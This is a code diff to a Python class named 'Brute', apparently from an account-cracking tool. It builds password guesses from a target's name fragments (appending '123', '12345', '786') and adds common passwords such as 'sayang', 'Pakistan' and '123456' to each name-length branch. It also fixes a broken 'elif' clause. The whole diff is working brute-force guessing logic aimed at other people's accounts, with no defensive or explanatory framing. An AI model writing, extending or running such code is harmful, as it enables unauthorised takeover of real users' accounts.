@@ -98,18 +98,29 @@ class Brute:
 						obj[1]+'786', obj[2]+'786',
 						obj[3]+'786', 'Pakistan',
 						'pakistan', '123456789',
-						'123456', '786786',
+						'sayang', '786786',
+						'sayang123', 'Sayang',
+						'123456',
 					]
 				elif len(obj) == 2:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',
+						'Pakistan', '123456',
+						'pakistan', '123456789',
+						'sayang', '786786',
+						'sayang123', 'Sayang',
+						
 					]
 				elif len(obj) == 3:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',
 						obj[2]+'123', obj[2]+'12345',
+						'Pakistan', '123456',
+						'pakistan', '123456789',
+						'sayang', '786786',
+						'sayang123', 'Sayang',
 					]
 				elif len(obj) == 4:
 					listpass = [
@@ -117,8 +128,12 @@ class Brute:
 						obj[1]+'123', obj[1]+'12345',
 						obj[2]+'123', obj[2]+'12345',
 						obj[3]+'123', obj[3]+'12345',
+						'Pakistan', '123456',
+						'pakistan', '123456789',
+						'sayang', '786786',
+						'sayang123', 'Sayang',
 					]
-				elif == 5:
+				else:
 					listpass = [
 						'sayang', 'Pakistan',
 						'pakistan', '786786',
